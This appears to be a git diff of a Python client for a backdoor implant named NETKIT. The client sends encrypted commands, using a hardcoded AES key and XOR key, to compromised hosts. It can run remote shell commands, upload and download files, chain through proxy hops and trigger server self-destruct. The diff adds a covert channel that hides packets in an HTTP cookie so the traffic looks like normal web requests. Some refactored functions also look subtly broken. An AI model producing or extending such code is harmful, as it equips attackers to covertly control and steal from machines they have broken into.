@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 
-from pwn import p8, xor
+from pwn import p8, xor, enhex, unhex
 import socket
 from Crypto.Cipher import AES
 import time
 import os
 import sys
+import requests
 
 
 AUTH_PASSWORD = 0
@@ -15,6 +16,57 @@ CMD_FILE_WRITE = 1
 CMD_FILE_EXEC = 2
 CMD_PROXY = 3
 CMD_EXIT = 4
+
+
+def xor_crypt(plaintext):
+    print = lambda *x: ...
+
+    ciphertext = xor(plaintext, b"NETKIT_XOR")[:len(plaintext)]
+    print('\nxor:', ciphertext)
+
+    return ciphertext
+
+
+def aes_encrypt(plaintext):
+    print = lambda *x: ...
+
+    padlen = 16-(len(plaintext) % 16)
+    if padlen == 16:
+        padlen = 0
+
+    plaintext += padlen.to_bytes(1, 'little') * padlen
+    print(f'\npad: {plaintext} ({len(plaintext)-padlen})')
+
+    iv = b"IV"*8
+    cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
+    ciphertext = iv + cipher.encrypt(plaintext)
+    print('\naes:', ciphertext)
+
+    return ciphertext
+
+
+def aes_decrypt(ciphertext):
+    print = lambda *x: ...
+
+    cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, ciphertext[:16])
+    padded = cipher.decrypt(ciphertext[16:])
+    print("\naes decrypt (padded):", padded)
+    pad_size = ord(padded[len(padded)-1:])
+    if 0 < pad_size < 16:
+        for b in padded[:-pad_size:-1]:
+            padded_correct = b == pad_size
+            if not padded_correct:
+                break
+        if padded_correct:
+            plaintext = padded[:-pad_size]
+        else:
+            plaintext = padded
+    else:
+        plaintext = padded
+
+    print('\naes decrypt:', plaintext)
+
+    return plaintext
 
 
 class PacketReq:
@@ -28,24 +80,10 @@ class PacketReq:
         return self.encrypt(p8(self.auth_id) + self.password + p8(self.cmd_id) + self.content)
 
     def encrypt(self, plaintext: bytes) -> bytes:
-        print = lambda *x: ...
+        ciphertext = xor_crypt(plaintext)
+        ciphertext = aes_encrypt(ciphertext)
 
-        data = xor(plaintext, b"NETKIT_XOR")[:len(plaintext)]
-        print('\nxor:', data)
-
-        padlen = 16-(len(data) % 16)
-        if padlen == 16:
-            padlen = 0
-
-        data += padlen.to_bytes(1, 'little') * padlen
-        print(f'\npad: {data} ({len(data)-padlen})')
-
-        iv = b"IV"*8
-        cipher = AES.new(b"AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD", AES.MODE_CBC, iv)
-        data = iv + cipher.encrypt(data)
-        print('\naes:', data)
-
-        return data
+        return ciphertext
 
 
 class PacketRes:
@@ -56,33 +94,10 @@ class PacketRes:
         self.content = data[5:]
 
     def decrypt(self, ciphertext: bytes) -> bytes:
-        print = lambda *x: ...
+        ciphertext = aes_decrypt(ciphertext)
+        plaintext = xor_crypt(ciphertext[:len(ciphertext)])
 
-        print("\n==========")
-        print(f"\nraw data:", ciphertext)
-
-        cipher = AES.new("AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD".encode(), AES.MODE_CBC, ciphertext[:16])
-        padded = cipher.decrypt(ciphertext[16:])
-        print("\naes decrypt (padded):", padded)
-        pad_size = ord(padded[len(padded)-1:])
-        if 0 < pad_size < 16:
-            for b in padded[:-pad_size:-1]:
-                padded_correct = b == pad_size
-                if not padded_correct:
-                    break
-            if padded_correct:
-                data = padded[:-pad_size]
-            else:
-                data = padded
-        else:
-            data = padded
-
-        print('\naes decrypt:', data)
-
-        data = xor(data, b"NETKIT_XOR")[:len(data)]
-        print('\nxor decrypt:',  data)
-
-        return data
+        return plaintext
 
 
 def encapsulate_proxies(host_list: list[tuple[str, int]], packet: PacketReq) -> PacketReq:
@@ -102,12 +117,10 @@ def decapsulate_proxies(host_list: list[tuple[str, int]], res: PacketRes) -> Pac
     return res
 
 
-def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
+def _sock_sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(addr)
 
-    print = lambda *x: ...
-    
     data = sendbuf
     print('\nsend:', data)
 
@@ -121,10 +134,21 @@ def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
 
     if len(data) == 0:
         raise Exception("[!] auth failed")
-    
+
     print(f'recv ({len(data)} bytes):', data)
 
-    return data
+
+def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
+    hex_sendbuf = enhex(sendbuf)
+    r = requests.get(f"http://{addr[0]}:{addr[1]}/", cookies={"SOCS": hex_sendbuf})
+
+    start = r.headers['Set-Cookie'].index("SOCS") + 5
+    end = r.headers['Set-Cookie'][start:].index(";") + 5
+    data = r.headers['Set-Cookie'][start:end]
+
+    unhex_recvbuf = unhex(data)
+
+    return unhex_recvbuf
 
 
 def sendrecv_encapsulate(host_list: list[tuple[str, int]], original_packet: PacketReq) -> PacketRes:
@@ -189,7 +213,7 @@ def main(argv):
             host_list.append((ip, int(port)))
 
     if host_list == []:
-        print(f"[!] usage: {argv[0]} <<ip>:<port>> [<ip>:<port>] [<ip>:<port>] ...")
+        print(f"[!] usage: {argv[0]} <<ip>:<port>> [<ip>:<port>] [<ip>:<port>] ...\n")
         return
 
     while True:
@@ -200,26 +224,26 @@ def main(argv):
             continue
         elif cmd_argv[0].lower() == "download":
             if len(cmd_argv) != 2:
-                print("usage: download <remote_path>")
+                print("usage: download <remote_path>\n")
                 continue
 
             rsp = download(host_list, password, cmd_argv[1])
             if rsp.retv < 0:
-                print(f"[-] failed to download file '{cmd_argv[1]}' from server to local")
+                print(f"[-] failed to download file '{cmd_argv[1]}' from server to local\n")
                 continue
 
-            print(f"[+] file successfully downloaded '{cmd_argv[1]}' from server to local (saved with flat filename in pwd)")
+            print(f"[+] file successfully downloaded '{cmd_argv[1]}' from server to local (saved with flat filename in pwd)\n")
         elif cmd_argv[0].lower() == "upload":
             if len(cmd_argv) != 3:
-                print("usage: upload <local_path> <remote_path>")
+                print("usage: upload <local_path> <remote_path>\n")
                 continue
 
             rsp = upload(host_list, password, cmd_argv[1], cmd_argv[2])
             if rsp.retv < 0:
-                print(f"[-] failed to upload file '{cmd_argv[1]}' to the server as '{cmd_argv[2]}'")
+                print(f"[-] failed to upload file '{cmd_argv[1]}' to the server as '{cmd_argv[2]}'\n")
                 continue
 
-            print(f"[+] successfully uploaded file '{cmd_argv[1]}' as '{cmd_argv[2]}' to server")
+            print(f"[+] successfully uploaded file '{cmd_argv[1]}' as '{cmd_argv[2]}' to server\n")
         elif cmd_argv[0].lower() == "hosts":
             hosts_usage = lambda: (
                 print("usage:"),
@@ -238,21 +262,21 @@ def main(argv):
 
                 ip, port = cmd_argv[2].split(":")
                 host_list.append((ip, int(port)))
-                print(f"[+] successfully added device {ip}:{port} to hosts list")
+                print(f"[+] successfully added device {ip}:{port} to hosts list\n")
             elif cmd_argv[1] == "pop":
                 if len(cmd_argv) != 2:
                     hosts_usage()
                     continue
 
                 if len(host_list) == 1:
-                    print("[!] 1 host in list. cannot pop")
+                    print("[!] 1 host in list. cannot pop\n")
                     continue
 
                 host_list.pop(-1)
-                print(f"[+] successfully popped host {ip}:{port}")
+                print(f"[+] successfully popped host {ip}:{port}\n")
         elif cmd_argv[0].lower() == "[self-destruct]":
             server_exit(host_list, password)
-            print(f"[+] successfully self destructed server {host_list[-1]}")
+            print(f"[+] successfully self destructed server {host_list[-1]}\n")
             host_list.pop(-1)
         elif cmd_argv[0].lower() == "cd":
             pwd_new = os.path.normpath(os.path.join(pwd, cmd_argv[1]))
@@ -267,10 +291,10 @@ def main(argv):
             cmd = ' '.join(cmd_argv)
             rsp = exec(host_list, password, pwd, cmd)
             if rsp.retv == 0x7f00:
-                print(f"command not found (something went wrong): {cmd.split(' ')[0]}")
+                print(f"command not found (something went wrong): {cmd.split(' ')[0]}\n")
                 continue
             elif rsp.retv != 0:
-                print(f"retv: {rsp.retv}, domain: {rsp.domain}")
+                print(f"retv: {rsp.retv}, domain: {rsp.domain}\n")
 
             print(rsp.content.decode("utf-8", "backslashreplace"))
 
